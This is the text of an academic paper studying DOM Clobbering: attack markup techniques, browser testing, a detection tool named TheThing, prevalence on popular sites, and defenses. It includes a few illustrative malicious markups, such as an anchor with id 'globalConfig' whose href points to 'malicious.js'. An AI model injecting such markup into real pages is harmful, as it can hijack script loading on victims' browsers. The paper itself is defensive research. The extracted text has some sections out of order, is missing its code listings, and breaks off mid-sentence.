Abstract—DOM Clobbering is a type of code-less injection
attack where attackers insert a piece of non-script, seemingly
benign HTML markup into a webpage and transform it
to executable code by exploiting the unforeseen interactions
between JavaScript code and the runtime environment. The
attack techniques, browser behaviours, and vulnerable code
patterns that enable DOM Clobbering has not been studied
yet, and in this paper, we undertake one of the ﬁrst evaluations
of the state of DOM Clobbering on the Web platform. Starting
with a comprehensive survey of existing literature and dynamic
analysis of 19 different mobile and desktop browsers, we sys-
tematize DOM Clobbering attacks, uncovering 31.4K distinct
markups that use ﬁve different techniques to unexpectedly
overwrite JavaScript variables in at least one browser. Then, we
use our systematization to identify and characterize program
instructions that can be overwritten by DOM Clobbering, and
use it to present TheThing, an automated system that detects
clobberable data ﬂows to security-sensitive instructions. We
instantiate TheThing on the top of the Tranco top 5K sites,
quantifying the prevalence and impact of DOM Clobbering
in the wild. Our evaluation uncovers that DOM Clobbering
vulnerabilities are ubiquitous, with a total of 9,467 vulnerable
data ﬂows across 491 affected sites, making it possible to mount
arbitrary code execution, open redirections, or client-side re-
quest forgery attacks also against popular websites such as
Fandom, Trello, Vimeo, TripAdvisor, WikiBooks and GitHub,
that were not exploitable through the traditional attack vectors.
in this paper, we also evaluate the robustness of
Finally,
the existing countermeasures, such as HTML sanitizers and
Content Security Policy, against DOM Clobbering.

1. Introduction

Arbitrary client-side JavaScript execution has been one of
the major threats against web applications since the early
days, traditionally achieved by injecting JavaScript code into
vulnerable pages, e.g., Cross-Site Scripting (XSS) attacks [1–
11]. However, over the past 20 years, the growth of Web
technology has introduced unforeseen interactions between
JavaScript programs and the execution environment that
can result in execution of arbitrary code without injecting
JavaScript but only by injecting seemingly harmless HTML

markups. The research community has only recently started
studying the security of these interactions, mainly focusing
on small code fragments called script gadgets [12] that
react to injected HTML markups and transform it into code.
Unfortunately, script gadgets are only the tip of the iceberg,
and other complex interactions exist that attackers can abuse
to hijack the program execution, which, to date, are largely
unexplored.

DOM Clobbering is a vulnerability that originates from
a naming collision between JavaScript variables and named
HTML markups, where browsers replace pre-existing content
of an undeﬁned variable with an HTML element when the
variable name and the element’s name (or id) attribute
match. Developers unaware of such behavior may use the
content of undeﬁned variables for sensitive operations, such
as URLs for fetching remote content, and attackers can
exploit it by injecting markups with colliding names. DOM
Clobbering vulnerabilities have been known for over a
decade, with the ﬁrst instance identiﬁed in 2010 [13] where
an iframe named self allowed attackers to overwrite
the top window location of webpages containing frame-
busting code, i.e., assignments such as top.location
= self.location. Since then, security researchers have
identiﬁed new, more subtle attack variants, combining pairs of
HTML tags (e.g., [14, 15]) or browser-speciﬁc markups and
attributes (e.g., [16–19]), and clobbering not only variables,
but also deep object properties (e.g., [20–22]), nested window
proxies (e.g., [21, 23]) and loops (e.g., [21]). When looking
at the possible combinations of tags, attributes, code features,
and runtime behaviors, prior works have merely scratched
the attack surface, and, to date, we still miss a systematic
and comprehensive exploration of this threat.

Recently, DOM Clobbering vulnerabilities in Gmail [22]
and Google Analytics [24, 25] revamped new discussions
about defenses, such as proposing to switch off named
property accesses for DOM elements at the browser level (see,
e.g., [25–27]), which has been dismissed since, according
to Google Chrome telemetry data, about 10.5% of the
pages in 2021 use named property accesses to implement
functionalities that could otherwise break [28]. To date, the
burden of protecting from DOM Clobbering attacks is solely
on developers’ hands, who can use existing countermeasures
such as HTML sanitizers tailored to protect against DOM
Clobbering, e.g., DOMPurify [7], or mitigate the risk of
code execution via Content Security Policy (CSP) [29–31].

1

Unfortunately, DOMPurify protects only from speciﬁc DOM
Clobbering cases, whereas CSP cannot prevent the execution
of already-present code that reacts to markup injections,
suggesting that existing countermeasures may be incomplete
or even insufﬁcient. As a last resort, developers can develop
their own defenses, requiring a deep understanding of the
main threat and its variants, which, unfortunately, may not
be the case. For example, as witnessed by recent DOM
Clobbering vulnerabilities discovered in HTML sanitizers,
e.g., DOMPurify [17] and HTML Janitor [20], developers
may still be largely unaware of the risk posed by DOM
Clobbering vulnerabilities.

In this paper, we take a step back and take a deep look
at DOM clobbering, with, to the best of our knowledge, the
ﬁrst systematic and comprehensive study on this neglected
vulnerability class, covering three main aspects: a systematic
exploration of the attack surface, a measurement of affected
and vulnerable websites, and a review and evaluation of
defenses. Starting from a comprehensive survey of prior
DOM Clobbering vulnerabilities, we systematically generate
candidate DOM Clobbering markups, and automatically test
desktop and mobile browsers against them, covering all
known HTML tags and attributes–including custom ones–and
markup relationships. Then, we propose TheThing, a DOM
Clobbering detection tool that combines hybrid program
analysis, i.e., [32], for the discovery of potentially-vulnerable
data ﬂows, with forced execution, i.e., [33], for the automated
vulnerability veriﬁcation, leveraging the generated DOM
Clobbering markups. We instantiate TheThing against the
Tranco top 5K websites to quantify the prevalence and
impact of DOM Clobbering vulnerabilities, processing, in
total, over 24.6B lines of JavaScript code across 18.3M
scripts and 205.6K webpages. Finally, we identify, review,
and evaluate defenses, covering existing countermeasures and
secure code patterns. In particular, we ﬁrst precisely measure
the cost-beneﬁt trade-off of browser-level countermeasures
and thoroughly test HTML sanitizers. Then, we review the
vulnerable code discovered by TheThing, identify common
developer mistakes, and distill a list of secure coding patterns.
Our results show that the attack surface of DOM Clob-
bering vulnerabilities is large, with only 481 out of 31,432
generated DOM Clobbering markups are currently known,
and the remainings are either previously-unknown instances
(148) or variants of known cases (30,803). When grouping
markups by browser behaviors, we observe ten different
behavioral groups, showing that while most of the attacks
are shared across browsers, many others work with speciﬁc
browsers only. In addition, our experiments discovered 114
new native browser APIs that these markups clobber in
at least one browser, including security-sensitive APIs like
cache storage [34] and trusted types [35]. Second, DOM
Clobbering vulnerabilities are quite widespread, affecting
9.8% of the top 5K websites, including popular sites like
GitHub, Fandom, Trello, Vimeo, TripAdvisor, WikiBooks
and AliExpress, leading to severe consequences such as
arbitrary code execution, client-side CSRF [32], and open
redirections [36, 37]. Third, when looking at the browser-
level defenses, disabling named property accesses can cause

more breakage, i.e., 2,561 websites, than beneﬁts, i.e., 491
vulnerable websites, with a cost-beneﬁt ratio of 5.2:1 web-
sites. In the absence of a browser-level ﬁx, developers need to
be particularly careful when choosing a countermeasure, as
they balance protection with usability. For example, 55% of
the most popular HTML sanitizers across the ﬁve most used
web languages are vulnerable to at least one of the 31.4K
clobbering markups by default. The remaining 45% sanitizers
remove named properties, i.e., id and name attributes, which
may interfere with the DOM manipulation operations. Also,
our results show that CSP is insufﬁcient because 85% of the
discovered vulnerabilities can cause code execution without
manipulating the src attribute. Finally, our results show that
developers can ﬁx vulnerabilities at the code level, and we
identify eight distinct vulnerable code patterns to avoid and
propose four secure patterns to ﬁx them.
Contributions. To summarize, this paper makes the follow-
ing contributions:

• We conduct the ﬁrst comprehensive and systematic
study of DOM Clobbering, covering vulnerability, attack
techniques, detection, prevalence, impact, and defenses.
• We propose a systematic technique to identify DOM
Clobbering markups and test browsers automatically,
identifying 148 previously-unknown ones, 30,803 new
variants, and 114 new browser APIs that can be clob-
bered in at least one browser.

• We present TheThing, an automated detection tool for
DOM Clobbering that uncovered 9,467 DOM Clob-
bering vulnerabilities, affecting 9.8% of the Tranco
top 5K sites, of which 44 that we manually conﬁrmed
to be exploitable, including popular sites like GitHub,
Fandom, Vimeo, Trello, TripAdvisor, and AliExpress.
• We evaluate the robustness of 29 client-side and server-
side HTML sanitizers and CSP, showing that 55%
of sanitizers are vulnerable and 85% of the DOM
Clobbering vulnerabilities cannot be mitigated by CSP.
• We review existing countermeasures, analyze common
mistakes of the 491 vulnerable sites, and distill a list
of recommendations and secure coding patterns.

2. Background

Before presenting our study, we ﬁrst dissect and introduce
the DOM Clobbering vulnerability in §2.1, and then, we
present the threat model of this work in §2.2.

2.1. DOM Clobbering Vulnerability

DOM Clobbering vulnerabilities originate from a naming
collision between JavaScript variables and named HTML
markups, i.e., markups with an id or name attribute [15,
38, 39]. When an undeﬁned variable [40, 41] and an HTML
markup have the same name, the browser replaces the pre-
existing content of the variable with the DOM object mirror-
ing the markup type. Listing 1 shows a snippet of vulnerable
code, which loads a script whose URL is stored in a global
conﬁguration object, i.e., window.globalConfig. In
more details, the code ﬁrst creates a script tag (line 1), and
then, it retrieves the global conﬁguration object and stores
it in a local variable config (line 2). If the conﬁguration
object does not exist, it uses a minimal default conﬁguration,
i.e., {href: ‘script.js’} (line 2). Then, the program
sets the src attribute of the newly created script tag to
the href property of the conﬁguration object (line 3) and
appends the new script to the DOM tree (line 4).

id="globalConfig" href="malicious.js">.
When parsing such a markup code,
the browser maps
the anchor tag element to the window.globalConfig
property as mandated by the named property access
the HTML speciﬁcations (see [42–44]). The
rule of
escalation to arbitrary code execution happens in line 3,
when the code reads the href property of the object
window.globalConfig, which no longer contains the
object with the global conﬁguration but it contains the
attacker-controlled anchor tag whose href property value
is malicious.js.

Attackers can abuse named property accesses in other
ways, where instead of overwriting variables by HTML nodes,
they can overshadow browser APIs. Listing 2 illustrates an ex-
ample of such an attack. Similarly to Listing 1, this code also
dynamically creates and loads a script. Instead of fetching
the URL from a global conﬁguration object, the code intends
to use the baseURI attribute of the main HTML tag via the
document.documentElement API (line 2). An attacker
can manipulate the content of src in line 3 by shadow-
ing the native property document.documentElement
using an attacker-injected node in the DOM tree [45],
e.g., a form element with name="documentElement"
and the custom property baseURI="malicious.js".
When parsing the form tag, the browser maps the prop-
erty document.documentElement to the JavaScript

web attacker [46, 47] can achieve that, e.g., adding a preview
of a post to the client-side webpage by leveraging the URL
parameters. Another example is the case where the attacker
can implant a persistent DOM Clobbering payload in the
target webpage, which can lie dormant, and exploited later
on to attack a victim, e.g., adding persistent comments in the
UI through Gmail’s dynamic email feature [48] which allows
including HTML content [22], or user-generated Markdown
descriptions in code repositories that are turned into HTML
content [49, 50]. Finally, a more powerful web attacker
(e.g., [5, 12]) who is aware of a markup injection vulnerability
can manipulate the DOM tree.

3. Problem Statement

This paper aims to answer the following questions:

(RQ1) DOM Clobbering Attack Techniques. When look-
ing at the evolution of DOM Clobbering attack markups, we
observe a consistent complexity growth, starting from a single
HTML element [13] that can overwrite a variable, evolving
with pairs of HTML tags [14, 15] that clobber properties of
objects (2013-15), and then advancing into a wide variety
of browser-speciﬁc combinations of different HTML tags
and attributes that can not only overwrite variables, but
also native DOM objects (2015-18) [16–19], nested object
properties, and loop elements (2018-22) [21–23]. Despite the
growth of markups’ complexity, the exploration of the attack
surface has not been conducted systematically, and to date,
many of the possible combinations of tags, attributes, markup
relationships and possible JavaScript object manipulations
are not considered. As a ﬁrst research question, we intend to
ﬁll this gap and exhaustively explore such an attack surface
by generating clobbering markups and testing modern mobile
and desktop browsers automatically.
(RQ2) Detection, Prevalence and Impact. While the ex-
istence of DOM Clobbering is known for more than a
decade [13, 14], we still do not have a measurement about
the prevalence, impact, and code patterns of this vulnerability.
In this paper, we intend to quantify the prevalence of DOM
Clobbering in the wild, identify vulnerable behaviours, and
examine their impact to shed some light on possible causes
and factors hampering web applications’ security.
(RQ3) Defenses and Effectiveness. As a ﬁnal question, we
look at the defenses, their effectiveness, and cost-beneﬁt,
leveraging the data generated and collected from the previ-
ous answers, i.e., DOM Clobbering markups, vulnerability
prevalence, and developer mistakes. In particular, we intend
to re-evaluate the cost-beneﬁt trade-off resulting from dis-
abling named property accesses in browsers and thoroughly
assess existing solutions such as HTML sanitization [7],
Content-Security Policy (CSP) [22, 29], and freezing object
properties [51] against DOM Clobbering. Finally, we intend
to review developers’ mistakes and identify vulnerable and
secure coding patterns that can ﬁx those issues.

2.2. Threat Model

4. Attack Techniques

In a DOM Clobbering attack, the attacker needs to insert an
ad-hoc HTML payload into a target, vulnerable webpage. A

The ﬁrst part of this paper addresses RQ1, investigating
the different ways DOM Clobbering markups can manipulate

3

JavaScript variables, object properties, and native APIs.
Before presenting our ﬁndings (§4.2), we describe the
methodology we followed to answer this RQ (§4.1).

4.1. Methodology

Our methodology comprises two main steps. First, we
review existing works on DOM Clobbering attacks, looking
for the various techniques to generate markups and at the
browser speciﬁcations causing the overrides. Then, we apply
the information gathered to generate markups exhaustively
and thoroughly test browsers.

4.1.1. Systematization of Known Instances

As the ﬁrst step, we systematically reviewed the existing
literature on DOM Clobbering attack markups, i.e., the aca-
demic literature [7, 12, 13, 26], HackerOne vulnerability re-
ports [52], the CVE database [53], Bugzilla bug reports [16],
and non-academic resources (see, i.e., [14, 15, 17, 21–
23, 39, 54, 55]). Then, for each discovered DOM Clobbering
instance, we extracted the HTML tags, attributes, the clob-
bered target (e.g., variable or window/document property),
the object type of the clobbered target (e.g., HTMLElement
or WindowProxy), and tags relation (i.e., child, srcdoc,
or sibling). Then, we looked for the corresponding browser
speciﬁcation rules that explain the reason why the clobbering
instance works. When the rule deﬁnes other variants of
the clobbering instance, we add them to the list of the
instances. Accordingly, we reviewed the HTML and DOM
speciﬁcations [56, 57], and GitHub issues in the speciﬁca-
tions’ repositories, i.e., W3C permissions policy [27], WICG
document policy [19, 25], and WHATWG HTML and DOM
standard repositories [18, 58]. Finally, we group instances
together based on their similarity, i.e., tags, attributes, target,
and the type of the value it refers to. Table 1 shows the
result of our systematization.

4.1.2. Markup Generation and Browser Testing

Starting from our systematization, we derived a list of
rules for generating DOM Clobbering markups, covering
all HTML tags, attributes, tags’ relations, and attack targets
(i.e., a variable, an object property, or a native browser API).
First, we generated candidate HTML markups for a target
‘x’ using all the 142 valid HTML tags, including a custom
tag (e.g., mytag), and all the 244 valid HTML attributes,
including a custom attribute. For each tag, we set the value
of each attribute to ‘x’ and add the JavaScript code that
checks whether the markup clobbers the target ‘x’. Then,
we generated markups for object properties ‘x.y’ and ‘x.x’
combining all pairs of the 142 HTML tags considering three
relations: sibling tags, parent-child tags, and the srcdoc
attribute value. The experiments with a single tag showed
that only name and id attributes create named properties.
Accordingly, to reduce the number of test cases to a testable
size, the generation of markups for object properties did not
consider combinations of all HTML attributes, but only those
of the name and id, e.g., id=x, or id=x, name=y.

After generating all markups, we put each of them in a
test webpage, along with a JavaScript code that veriﬁes if

the target is clobbered. Then, we instantiate each browser
and visit the test pages automatically. For web browsers, we
used BrowserStack [59] to programmatically control browser
versions, names, and their execution life-cycle in a fully
automatic fashion. We evaluated (the latest versions of) all
mobile and desktop browsers available in BrowserStack (i.e.,
16 browsers), and additionally tested the Tor Browser for
the sake of completeness. Finally, for Safari, we considered
three different versions that correspond to the three recent
macOS operating systems as Safari cannot be upgraded
standalone [60]. In total, we evaluated 19 browsers.

Overall, our generation algorithm produced 3,906,136
candidate test markups, of which 34,648 are for targets
‘x’, i.e., variables or native APIs, and the rest are for object
properties ‘x.y’ and ‘x.x’. When testing variables, we replace
the target ‘x’ with the variable name generating in total
34,648 test cases for variables. When testing native DOM
APIs, we replace the target ‘x’ with the API function or
property name (e.g., the cookie property of document),
obtaining 34,648 test cases per API function. As of October
2021, the total number of DOM API objects is 581 [61],
of which 347 are window APIs (i.e., 291 properties and
56 methods) [62], and 234 APIs are for the document
object (i.e., 178 properties and 56 methods) [63]. In total,
we generated 20,130,488 test cases for native APIs.

4.2. Results

This section presents the results of our literature review

and browser testing.

4.2.1. Systematization of Known Instances

Table 1 summarizes the DOM Clobbering markups. Our
review identiﬁed 481 DOM Clobbering instances that we
grouped into 13 classes based on their structural similarity.
Each instance shows how a speciﬁc HTML markup (e.g.,
<a id=x>) can clobber a speciﬁc target, i.e., variable
(e.g., x) or object property (e.g., window.x), and replaced
it with a JavaScript object (e.g., x is shadowed by an
HTMLAnchorElement). For each class, the table shows
the clobbered target, the HTML code that can overwrite it,
and the object type stored in the target. Also, the review
of the HTML and DOM speciﬁcations resulted in the
identiﬁcation of ﬁve rules that instruct the browser to store
the reference type in the target, which is mapped to each
known DOM Clobbering instance. The rules are Named
Access on Window ([56] §7.3.3), DOM Tree Accessors
([56] §3.1.5), Form Element ([56] §4.10.3), Iframe srcdoc
attribute ([56] §4.8.5), and HTMLCollection ([57] §4.2.10.2),
which we labeled as R1 to R5, respectively. The rest of this
section details each group of clobbering markups and the
rules abused by them.
Named Access Window. These group of markups leverage
a single HTML element whose id or name is set to a
target variable ‘x’, clobbering window.x due to browsers’
compliance with the Named Access on the Window Object
rule (R1) [42]. We reviewed this rule in §2.1. Note that we
use window.x and ‘x’ interchangeably because all global

TABLE 1: Overview of known DOM Clobbering markups grouped by their corresponding rules in the HTML [56] and DOM [57] speciﬁcations.

variables belong to the global window object by default.
DOM Tree Accessors. The markups of this group can
shadow document properties because browsers comply
with the DOM Tree Accessors rule (R2) [43], which instructs
browsers how to retrieve properties of the document object
(e.g., DOM elements). Similarly to the previous group, these
markups use a single named HTML element (e.g., object,
or embed) to clobber a property ‘x’ of the document.
Form Parent-Child Relationship. These markups clobber
properties ‘X.y’ where ‘X’ can be any of ‘x’, window.x,
and document.x. First, they exploit either the rules R1 or
R2 to clobber the base object ‘X’. Then, they use the Form
Element rule (R3) to clobber property ‘y’ of object ‘X’,
i.e., the form elements’ parent-child relationships where the
browser creates a property of the second element for the
ﬁrst element’s accessor variable [21]. DOM Clobbering code
that rely on this technique comprise a form tag and a child
(e.g., an input) named ‘x’ and ‘y’, respectively.
Nested Window Proxies. These markups use the Iframe
srcdoc rule (R4) to create nested window proxies that
are named with ‘x’ and ‘y’, respectively. Similarly to the
previous group of markups, it uses the rule R1 or R2 to
clobber the base object. Then, the stacked iframes enable
attackers to exploit frame navigation features to clobber
object properties like ‘x.y’ [21, 23].
HTMLCollection. The last gour groups of markups rely
on a different rule known as HTMLCollection (R5). Specif-
ically, when two or more elements have the same id in
the DOM tree, browsers create an array-like object called
HTMLCollection [14, 64], which contains all elements
with the same id. Elements inside HTMLCollections can be
accessed by (i) their index in the collection and (ii) their
id and name, enabling attackers to abuse R5 to clobber
arrays [21] and loop elements (e.g., ‘x’ and ‘x[i]’) as well
as object properties like ‘x.x’ and ‘x.y’ [22]. Similarly to
the previous techniques, rules R1-2 can be combined with
R5 to clobber nested object properties like window.x.y.

4.2.2. Clobbering Variables and Object Properties

Our browser testing experiments uncovered 31,432 distinct
DOM Clobbering markups that work in at least one browser,
as summarized in Table 2, from which 145 clobber a variable
‘x’, and the remaining 31,287 clobber ‘x.y’ and ‘x.x’.

Post-processing of Results. As the manual review of 31K
individual instances is infeasible, we group instances by
similar features. We start with preliminary groups based
on the set of browsers they work in and the target they
clobber. Then, we look at the structural features, i.e., tag1,
tag2, attribute1, attribute2, and relationship, and we merge
two groups when all the structural features but one are the
same. Accordingly, we reduced the 31K instances to 74
classes, as shown in Table 2, and map each class to our
systematization of known instances. In summary, out of the
74 classes, 10 classes rely on the Window Named Access,
four classes on DOM Accessors, 13 classes on the Parent-
Child Relationship, four classes on Nested Window Proxies,
and ﬁnally 43 classes leverage HTMLCollections.
Findings. By comparing the 74 DOM Clobbering classes in
Table 2 with the 13 previously identiﬁed classes in Table 1,
we discovered that the 31,432 DOM Clobbering markups
include 148 new instances, 481 previously known ones, and
30,803 variants of the known ones, which rely on one of the
ﬁve DOM Clobbering techniques of §4.2.1.

The variants derive from markups that are already known
for DOM Clobbering according to Table 1, but now have
one or more additional attributes, or are permuted in part
with a different HTML tag. For example, HTMLCollections
clobbering window properties may be formed not only for
two similar HTML tags as in Table 1 (e.g., two a tags with
id=x), but also for certain combinations of dissimilar tags
(e.g., svg and a), which accounts for a large number of
the clobbering instances. Other variants are cases where
additional id and name attributes are added to the existing
clobbering markups. For example, when looking at form
elements and their childern in Table 1, we observe that each
tag of the markup has only one id or name. However, as
demonstrated by the results in Table 2, these attributes may
exist simultaneously on HTML tags and with similar or
dissimilar values, resulting in additional clobbering variants.
In comparison, the new clobbering instances rely on new
(pairs of) HTML tags and attributes that were previously not
known to be applicable for DOM Clobbering. We observed
that 28 out of the 74 identiﬁed classes contain at least one
new instance, with a total of 148 new instances. From these,
22 classes contain only new instances (i.e., 142 instances).
In the remaining of this section, we brieﬂy describe the new

TABLE 2: Overview of DOM Clobbering markups. Rows marked with E are classes that contain new DOM Clobbering instances. For all rows, clobbering
window.x also implies clobbering the variable x. Browsers with similar behaviours are grouped with the same color. The table highlights a total of 10
distinct groups of browser behaviours with respect to DOM Clobbering.

instances within each DOM Clobbering technique.

Named Access Window and DOM Tree Accessors. We
discovered that any custom HTML tag (e.g., customtag)
can be used to clobber a target variable x and window.x in all
web browsers. Also, iframe tags with id=x can clobber
document.x and named applet elements can clobber both
window.x and document.x. In total, we found ﬁve new
instances across four out of the 14 classes that rely on
the Window Named Access and DOM Accessors techniques.
Form Parent-Child. We discovered that browsers like
Firefox and Safari create accessor properties on JavaScript
objects due to element’s ancestral relationship in the DOM
tree for previously unknown pairs of tags and attributes, such
as a parent form tag with a embed, iframe, or applet
child with both a name and id attribute. Overall, among the
13 classes that rely on elements’ parent-child relationships,
we found four new markups in four different classes.

Nested Window Proxy. We identiﬁed two new clob-
bering markups in two out of the four classes which use
the Nested Window Proxies technique. In particular, we
discovered that using the id attribute in the nested frames
creates a named property on the base frame, referring to
a WindowProxy, whereas id on the base frame does
not create a WindowProxy accessible through the global
window or document.

HTMLCollection. We found 137 new clobbering in-
stances (across 18 classes) that lead to the construction
of HTMLCollections in a different way. Speciﬁcally, we
discovered that some browsers (e.g., Chrome and Firefox)
create an HTMLCollection not only when two elements
share the same id, but also when they have the same name
value. However, we observed that this happens only for
certain (combinations of) HTML tags, e.g., two object
tags and two form tags with the same name can form an
HTMLCollection, but not two div tags.
Analysis of Browsers’ Behaviours. Our experiments re-
vealed that browsers exhibit divergent behaviours when link-
ing named HTML elements to JavaScript variables (Table 2).
For example, we observed that for a signiﬁcant fraction of
the clobbering markups (i.e., 31,243 out of 31,432), there
is at least one browser that disagrees with others, rendering
the task of defending against DOM Clobbering increasingly
more challenging. In summary, we identiﬁed 10 distinct
groups of browser behaviours with respect to different DOM
Clobbering markups, which are highlighted in Table 2 in col-
ors, showing that while most of the attacks are shared across
browsers, many others only work with speciﬁc browsers.
The table shows that all Safari and iOS-based browsers
have their own distinct behaviours, whereas browsers like
Chrome, Opera, and Edge on Desktop and Android exhibit
the same behaviour. Note that, in general, similarities in
behaviours are expected because some browsers rely on
the same underlying engine. For example, Chrome, Edge
and Opera on Desktop are all Blink-based browsers [65],
whereas iOS browsers are required to use the WebKit engine
of Apple [66]. Finally, we observed that the least and highest

amount of DOM Clobbering risk is associated with using
browsers like Firefox Desktop/Android and Chromium-based
browsers on Desktop/Android in which 35 and 59 classes
of DOM Clobbering markups work, respectively.

4.2.3. Clobbering Native APIs

Overall, we identiﬁed a total of 347 DOM APIs (Table 12)
that can be clobbered in at least one browser using one of
the markups of §4.2.2, including 233 document and 114
window APIs. We observed that all document methods
and properties except the location property (i.e., 233
APIs) can be clobbered in all browsers unanimously, as
expected by the named property visibility algorithm [45] of
the speciﬁcation [19, 56]. However, this experiment resulted
in a new ﬁnding that for a total of 114/347 window APIs
(i.e., 91 properties and 23 methods), named properties can
shadow native properties that would otherwise appear on the
object in at least one browser, resulting in DOM Clobbering.
This includes security-sensitive APIs such as the cache
storage [34], notiﬁcation API [67], trusted types [35], and
web storage [68]–to name only a few instances. The complete
list of clobbered window methods and properties is in
Table 13 of §A.2. We observed that for 57/114 clobbered
APIs, there is at least one browser that disagrees with others.

5. Detection and Prevalence

The second part of this paper intends to evaluate the impact,
prevalence and variety of DOM Clobbering vulnerabilities
in real-world web applications (RQ2 of §3). In §5.1, we ﬁrst
present TheThing, an automated DOM Clobbering detection
tool. Then, in §5.2, we present our experiment results.

5.1. Detection

We formulate the problem of detecting DOM Clobbering
vulnerabilities into a series of data ﬂow analysis tasks
where we identify clobberable JavaScript variables, object
properties, and native APIs whose value ultimately reach
security-sensitive instructions, such as script src and eval.
Identifying such data ﬂows via pure static analysis is
not an easy task given the dynamic nature of client-side
JavaScript programs [32, 69, 70] and the scale of the analysis
as studying DOM Clobbering vulnerabilities requires the
collection and analysis of hundreds of webpages of real web
applications. Accordingly, we use and extend state-of-the-art
property graphs for JavaScript and graph traversals [32] to
identify potentially-vulnerable data ﬂows and then use forced
execution to conﬁrm the presence of the vulnerability.

Figure 1 shows the architecture of TheThing. At a high
level, it has three main components: (i) a web crawler
to collect webpages’ data and the JavaScript code, (ii) a
vulnerability analysis component that uses property graphs
and traversals for identifying potential DOM Clobbering
sources and capturing data ﬂows to security-sensitive sinks,
and ﬁnally (iii) a vulnerability veriﬁcation component that
dynamically conﬁrms the candidate data ﬂows by instru-
menting the code and forcefully executing it in a browser
to check if the ﬂow can occur at runtime. The rest of this
section details each component.

Figure 1: Architecture of TheThing.

5.1.1. Data Collection

To collect the client-side code of web applications, we
developed a JavaScript-enabled crawler leveraging Pup-
peteer [71] and Chrome DevTools Protocol (CDP) [72].
Starting from a seed URL of the website under test, it visits
the webpages following a depth-ﬁrst strategy, and stops when
it doesn’t ﬁnd new URLs, or the maximum of 100 URLs
is reached. During the visit, it collects the page resources
(e.g., scripts) and runtime state values (i.e., ﬁred events and
DOM objects’ properties) using the CDP and Puppeteer.

5.1.2. Vulnerability Analysis

Given the webpages’ data collected by the crawler,
TheThing creates a property graph of
the client-side
JavaScript program leveraging a modiﬁed engine of JAW [32].
Then, we formulate the problem of ﬁnding potential DOM
Clobbering data ﬂows into a series of graph traversal queries.
Hybrid Property Graphs. HPGs are graph-based repre-
sentations of client-side JavaScript programs that unify
multiple static code representations and runtime state values.
State values are event traces and environment properties,
e.g., the values of cookies and web storage. The static
code representation comprises several graphs, e.g., Abstract
Syntax Tree (AST), Control Flow Graph (CFG) and Program
Dependence Graph (PDG) that model the nesting of the
syntactical constructs of a program, the order and conditions
for the execution of program instructions, and the data ﬂow
and control dependencies within the statements of a program,
respectively. HPGs also model the event-driven transfer of
control within JavaScript programs via the Event Registration,
Dispatch and Dependency Graph [32]. Finally, they include
Semantic Types, which are labels initially assigned to source
and sink nodes to capture the semantic of those instructions
and then propagated through the graph following the program
calculation. These representations are encoded in a directed
graph in which nodes and edges can have labels and key-
value properties, known as a labeled property graph [32, 73].
Model Construction. After collecting the webpages’ scripts
and state values, TheThing instantiates an HPG, and imports
it into a Neo4j docker instance [74], allowing the graph to be
traversed declaratively using the Cypher query language [75].
Unfortunately, we could not use JAW as-is and modiﬁed it
to address several of its shortcomings. First, when building a
graph, JAW normalizes the webpage code by combining code
inside script tags into a single script. However, identifying
DOM Clobbering sources may require to distinguish the
code across two different scripts due to JavaScript variable

hoisting [41] and double-clobbering [17]. For example, a
runtime error in one script causes the browser to stop parsing
that script, and continue with parsing of the rest of the
scripts. Hence, variables initialized in the ﬁrst script are
treated as undeﬁned and can be a candidate DOM Clobbering
source. Such runtime errors can be caused intentionally by
attackers by a preliminary clobbering, e.g., clobbering a
native DOM function that is invoked in a script shadows its
value to an HTML element, which is not callable, leading
to a runtime error (Cf. Table 3). Accordingly, we changed
the normalization procedure to keep track of the script of
origin for each AST node.

Second, the semantic types of JAW are tailored for client-
side CSRF vulnerabilities and are not sufﬁcient to model
DOM clobbering. Accordingly, we added a new set of generic
semantic types for DOM Clobbering sources (Cf. Tables 3
and 9) and security-sensitive JavaScript sinks (Cf. Table 8).
Third, JAW does not fully support ES6, resulting in impre-
cise control and data ﬂow models. Accordingly, we applied
several enhancements. For example, we added support to
bind the function call arguments to their deﬁnition parameters
when the code uses the ES6 Rest parameters [76] and the
Spread operator [77] which improves the precision of the
call graph and PDG edges. Also, we created bindings for
the this object depending on the calling context [78],
and the binding for the arguments object for non-arrow
functions [79] to improve pointer analysis tasks.
Analysis Traversals. After construction of an HPG, we
traverse it to identify DOM Clobbering source nodes in the
graph. Table 3 presents the various types of DOM Clobbering
sources and their properties. The table shows that clobberable
native DOM APIs discovered in §4.2.3 can act as a DOM
Clobbering source. Identifying these objects in the program
is a matter of searching for a pre-deﬁned syntactic structure,
which is similar to other taint-style vulnerabilities like client-
side XSS. However, contrary to the traditional taint analysis,
not all DOM Clobbering sources are pre-deﬁned syntactic
objects. Instead, they can be a speciﬁc property of a program,
identifying which requires tracking the propagation of data
ﬂows within the program itself. This is because any used
variable that is undeﬁned within its execution context (i.e.,
previously not declared and assigned) can act as a DOM
Clobbering source. To identify such sources, we use PDG
data dependency edges, which specify that a variable deﬁned
at a source node is subsequently used at the destination
node. Speciﬁcally, we query the graph for Identiﬁer nodes
containing a variable v with no incoming PDG edge from
any AssignmentExpression or VariableDeclaration nodes that

assign to or declare the variable v. If there is such PDG
edge, we further check whether the declaration/ assignment
statement can hinder the clobberability of v based on the
criteria in Table 3, which can depend on the declaration
scope (i.e., same script or not), declaration position (i.e.,
before or after), and the declaration keyword (e.g., var vs
let) of that statement.

After identifying the source nodes, we associate to each
of them a label that captures the semantic type of the
source, e.g., a clobberable native property or custom variable
(Cf. Table 9). Then, given a list of JavaScript sinks, we
identify each of them in the graph and assign each a
relevant semantic type. Semantic types assigned to sink
instructions are propagated to other functions that encapsulate
the same semantic, e.g., the type WIN_LOC_WRITE is set
for instructions that set the value of window.location,
such as window.location.replace(), and is then
propagated to all other developer-deﬁned functions that can
set its value through one of their parameters. TheThing
considers different sink types to enable us to capture the
potential consequences of DOM Clobbering. The complete
list of sinks is in Table 8, which is derived by surveying and
aggregating the JavaScript sinks considered in prior academic
and non-academic resources (see, i.e., [1, 5, 36, 37, 80–
90]). Finally, we conduct forward data ﬂow analysis by
propagating semantic types from sources to sinks, and select
those ﬂows where a node with a sink semantic type is
tainted with a source type (i.e., pick up the attacker-controlled
values). The concrete queries are presented in Table 11 of
§A.2. This component outputs a set of paths with potential
data ﬂows from a DOM Clobbering source to a sink.

5.1.3. Vulnerability Veriﬁcation

Given a set of potential DOM Clobbering data ﬂows,
the goal of this step is to verify each ﬂow and eliminate
potential false positives. To accomplish this goal, TheThing
features a light-weight, in-browser dynamic taint analysis
engine leveraging Iroh.js [33]. After instrumenting the code
with Iroh for dynamic analysis, we ﬁrst check whether the
source variable of the data ﬂow is clobberable by creating a
suitable HTML clobbering payload for that variable using
